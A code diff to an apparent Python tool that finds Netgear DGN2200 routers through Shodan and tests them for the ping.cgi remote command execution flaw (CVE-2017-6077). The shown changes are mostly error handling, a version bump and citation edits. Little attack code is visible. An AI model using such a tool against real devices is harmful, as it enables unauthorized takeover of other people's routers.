@@ -1,3 +1,6 @@
+#NETGEAR DGN2200v1/v2/v3/v4
+#Remote Command Execution (ping.cgi)
+
 import sys
 import requests,socket
 import argparse
@@ -22,9 +25,10 @@ def search_shodan(SHODAN_API_KEY,query):
         file.close()
         return filename
 
-    except:
+    except shodan.APIError:
         raise shodan.APIError
-
+    except KeyboardInterrupt:
+        raise KeyboardInterrupt
 
 def fuzz(cmd,login,password,filename,auto_flag):
     creds = False
@@ -88,15 +92,15 @@ def assign_args():
     █████╗  ██║   ██║  ███╔╝   ███╔╝  ╚████╔╝ ██████╔╝██████╔╝██║██║     █████╔╝ 
     ██╔══╝  ██║   ██║ ███╔╝   ███╔╝    ╚██╔╝  ██╔══██╗██╔══██╗██║██║     ██╔═██╗ 
     ██║     ╚██████╔╝███████╗███████╗   ██║   ██████╔╝██║  ██║██║╚██████╗██║  ██╗
-    ╚═╝      ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝ v1.0
+    ╚═╝      ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝ v2.0
                                                                                  
     Discover actual vulnerable Netgear DGN2200 devices!
-          CVE-2017-6334 
+          CVE-2017-6077 
           NETGEAR DGN2200v1/v2/v3/v4
           Remote Command Execution (ping.cgi)
     
     Source:
-    https://www.exploit-db.com/exploits/41459/
+    https://www.exploit-db.com/exploits/41394/
     
     Adapted By: 
     MidnightSeer
@@ -149,6 +153,9 @@ def main(args):
             filename = search_shodan(args.api_key,args.query)
         except shodan.APIError:
             ColorPrint.PrintColor(ColorPrint.FAILED, "Shodan Lookup Failed", "Check your internet connection" , 11)
+            sys.exit(0)
+        except KeyboardInterrupt:
+            ColorPrint.PrintColor(ColorPrint.INFO, "Detected Keyboard Interrupt")
             sys.exit(0)
 
     elif args.tgt_file:
